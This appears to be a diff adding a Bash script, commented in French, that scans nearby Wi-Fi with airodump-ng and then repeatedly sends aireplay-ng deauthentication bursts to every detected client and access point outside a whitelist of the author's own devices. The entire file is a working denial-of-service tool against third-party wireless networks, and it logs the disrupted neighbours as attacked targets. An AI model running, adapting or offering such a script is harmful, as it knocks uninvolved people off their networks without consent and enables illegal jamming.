@@ -1,0 +1,133 @@
+#!/bin/bash
+
+# === Paramètres par défaut ===
+DEFAULT_IFACE="wlan1"
+DEFAULT_SCAN_DURATION=900    # 15 minutes
+DEFAULT_DOS_INTERVAL=60      # toutes les 60 secondes
+
+# === Récupération des arguments, ou valeurs par défaut ===
+IFACE="${1:-$DEFAULT_IFACE}"
+SCAN_DURATION="${2:-$DEFAULT_SCAN_DURATION}"
+DOS_INTERVAL="${3:-$DEFAULT_DOS_INTERVAL}"
+
+LOG_DIR="/home/nox/Security/airmon-dos"
+TMP_PREFIX="/tmp/airodump_capture"
+CSV_FILE="${TMP_PREFIX}-01.csv"
+LOG_FILE="$LOG_DIR/log_$(date +%F_%H-%M-%S).txt"
+
+# === Tes MACs et BSSIDs à ignorer ===
+MY_MACS=(
+    "54:F1:5F:7F:C1:0A"  # IPTV
+    "3E:3B:88:69:93:1B"  # IPAD
+    "3C:A0:67:E9:23:E7"  # ACER SWIFT
+    "F0:09:0D:7D:F0:5F"  # TAPO AR
+    "64:16:66:86:E4:9F"  # NEST SALON
+    "20:23:51:2B:33:C6"  # TAPO AV
+    "C8:69:CD:65:F8:BF"  # APPLE TV CHAMBRE
+    "5E:67:36:BA:05:A5"  # Iphone 7
+)
+
+MY_BSSIDS=(
+    "60:A4:B7:79:5B:83"  # TP-Link_8469 main BSSID (exemple)
+    "AA:BB:CC:DD:EE:FF"  # ancien placeholder
+)
+
+# === Préparation ===
+mkdir -p "$LOG_DIR"
+
+echo "[*] Passage de $IFACE en mode monitor..." | tee "$LOG_FILE"
+sudo airmon-ng start "$IFACE" >> "$LOG_FILE" 2>&1
+MON_IFACE="${IFACE}mon"
+echo "[*] Interface monitor : $MON_IFACE" | tee -a "$LOG_FILE"
+
+echo "[*] Lancement du scan wifi pendant $SCAN_DURATION secondes sur $MON_IFACE..." | tee -a "$LOG_FILE"
+sudo timeout "$SCAN_DURATION" airodump-ng --output-format csv --write "$TMP_PREFIX" "$MON_IFACE" >> "$LOG_FILE" 2>&1
+
+echo "[*] Scan terminé. Lancement des attaques DOS toutes les $DOS_INTERVAL secondes pendant $SCAN_DURATION secondes." | tee -a "$LOG_FILE"
+
+# Fonction pour vérifier si un MAC est dans la liste à ignorer
+is_ignored() {
+    local mac=$1
+    for m in "${MY_MACS[@]}"; do [[ "$mac" == "$m" ]] && return 0; done
+    for b in "${MY_BSSIDS[@]}"; do [[ "$mac" == "$b" ]] && return 0; done
+    return 1
+}
+
+# Calcul du nombre de cycles DOS à faire
+cycles=$(( SCAN_DURATION / DOS_INTERVAL ))
+if (( SCAN_DURATION % DOS_INTERVAL != 0 )); then
+    cycles=$(( cycles + 1 ))
+fi
+
+# Compteurs
+total_clients=0
+total_attacked=0
+total_ignored=0
+
+# Liste des cibles
+declare -a attacked_list=()
+
+for ((i=0; i<cycles; i++)); do
+    sleep "$DOS_INTERVAL"
+
+    if [[ ! -f "$CSV_FILE" ]]; then
+        echo "[!] Fichier CSV non trouvé. Abandon du cycle $((i+1))." | tee -a "$LOG_FILE"
+        continue
+    fi
+
+    # Extraction clients: Station MAC, BSSID
+    stations=$(awk -F',' '/Station MAC/{found=1; next} found && NF > 6 {print $1","$6}' "$CSV_FILE" | tr -d ' ')
+
+    if [[ -z "$stations" ]]; then
+        echo "[i] Aucun client détecté au cycle $((i+1))." | tee -a "$LOG_FILE"
+        continue
+    fi
+
+    for entry in $stations; do
+        CLIENT_MAC=$(echo "$entry" | cut -d',' -f1)
+        BSSID=$(echo "$entry" | cut -d',' -f2)
+
+        ((total_clients++))
+
+        if is_ignored "$CLIENT_MAC" || is_ignored "$BSSID"; then
+            ((total_ignored++))
+            echo "[i] Ignoré (autorisé) : $CLIENT_MAC / $BSSID" | tee -a "$LOG_FILE"
+            continue
+        fi
+
+        echo "[*] → DOS : Client $CLIENT_MAC connecté à $BSSID" | tee -a "$LOG_FILE"
+        aireplay-ng --deauth 10 -a "$BSSID" -c "$CLIENT_MAC" "$MON_IFACE" >> "$LOG_FILE" 2>&1
+
+        ((total_attacked++))
+        attacked_list+=("$(date +'%F %T') - BSSID: $BSSID - Client: $CLIENT_MAC")
+    done
+done
+
+# Résumé final
+echo -e "\n=== Résumé Final ===" | tee -a "$LOG_FILE"
+echo "Durée scan: $SCAN_DURATION secondes" | tee -a "$LOG_FILE"
+echo "Total clients analysés: $total_clients" | tee -a "$LOG_FILE"
+echo "Total clients attaqués: $total_attacked" | tee -a "$LOG_FILE"
+echo "Total clients ignorés: $total_ignored" | tee -a "$LOG_FILE"
+echo -e "\nListe des cibles attaquées :" | tee -a "$LOG_FILE"
+
+for target in "${attacked_list[@]}"; do
+    echo "$target" | tee -a "$LOG_FILE"
+done
+
+# Nettoyage et remise en mode managed
+echo "[*] Nettoyage des fichiers temporaires..." | tee -a "$LOG_FILE"
+rm -f "${TMP_PREFIX}"*
+
+echo "[*] Arrêt du mode monitor sur $MON_IFACE..." | tee -a "$LOG_FILE"
+sudo airmon-ng stop "$MON_IFACE" >> "$LOG_FILE" 2>&1
+
+echo "[*] Changement de propriétaire des fichiers logs vers nox:nox..." | tee -a "$LOG_FILE"
+sudo chown -R nox:nox "$LOG_DIR"
+
+echo "[✓] Script terminé. Logs dans $LOG_FILE"
+
+
+
+
+	
